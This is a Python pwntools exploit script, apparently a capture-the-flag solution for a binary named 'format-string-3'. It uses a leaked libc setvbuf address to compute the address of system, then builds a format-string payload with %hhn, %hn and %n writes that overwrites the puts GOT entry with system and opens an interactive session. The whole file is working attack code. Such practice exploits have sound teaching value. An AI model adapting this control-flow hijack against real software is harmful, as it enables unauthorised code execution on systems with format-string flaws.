from pwn import *
from math import ceil

# Buffer starts at position 38, so %38$p


#context.log_level = 'debug'

def extract_address(output):
    # Step 1: Decode the byte data to get a string
    hex_string = output.decode().strip()
    # Step 2: Convert the hexadecimal string to an integer
    hex_value = int(hex_string, 16)
    return(hex_value)

# Create a "%(int)x" payload, with padding to create a length of two cells.
# create_var_length_payload(20) would produce this b'%00000000000020x'
def create_var_length_payload(num_chars):
    payload = b'' + str(num_chars).encode()
    payload = b'%' + (b'0' * (14-len(payload))) + payload + b'x'
    print(str(payload))
    return payload


def main():
    # Set up the environment for LD_PRELOAD
    # env = {'LD_PRELOAD': './ld-linux-x86-64.so.2 ./libc.so.6'}
    
    binary = ELF('./format-string-3')
    got_puts_address = binary.got.puts
    print("puts address = " + hex(got_puts_address))

    # Start the process with the modified environment
    #pty = process.PTY
    p = process('./format-string-3')
    p.timeout = 1

    # Receive the initial output
    initial_output = p.recvuntil("Okay I'll be nice. Here's the address of setvbuf in libc: ")
    # Extract the setvbuf address
    setvbuf_address = extract_address(p.recvline())
    print(type(setvbuf_address))
    print(f"Extracted setvbuf address: {hex(setvbuf_address)}")
    system_address = setvbuf_address - 0x2AC90
    print(f"Calculated system address: {hex(system_address)}")

    system_address_lo_3 = (system_address & 0xFF)
    system_address_lo_2 = (system_address & 0xFFFF00) >> 8
    system_address_lo_1 = (system_address & 0xFFFFFFFF000000)>>24

    print(f"Masked LO 3 system address: {hex(system_address_lo_3)}")
    print(f"Masked LO 2 system address: {hex(system_address_lo_2)}")
    print(f"Masked LO 1 system address: {hex(system_address_lo_1)}")

    if system_address_lo_2 < system_address_lo_3:
        print("system_address_lo_2 < system_address_lo_3")
        exit()

    if system_address_lo_1 < system_address_lo_2:
        print("system_address_lo_1 < system_address_lo_2")
        exit()

    # Buffer starts at cell 38. We have 9 cells of pyaload before the addresses are written
    # into the buffer so we start at position 47.
    exploit = create_var_length_payload(system_address_lo_3)
    exploit += b'%47$hhnA'

    # Actual number of charaters printed are system_address_lo_3 + 1, we add one because the payload
    # above is padded with one byte or 'A' so it conusmes exactly one cell.
    exploit += create_var_length_payload(system_address_lo_2 - (system_address_lo_3+1))
    exploit += b'%48$hnAA'

    # Actual number of charaters printed are system_address_lo_2 + 2.
    # We add 2 because the payload above is padded with two bytes or 'AA'
    # so it conusmes exactly one cell.
    exploit += create_var_length_payload(system_address_lo_1 - (system_address_lo_2 +2))
    exploit += b'%49$nAAA'

    # Actual number of charaters printed at this point is system_address_lo_1 + 3.

    # Write in the adresses into the buffer.
    exploit += p64(got_puts_address) + p64(got_puts_address + 1) + p64(got_puts_address+3)
    p.sendline(exploit)

    with open("payload", "wb") as f:
        f.write(exploit)

    # Receive and print any remaining output
    # print(p.recvall())
    p.interactive()

if __name__ == '__main__':
    main()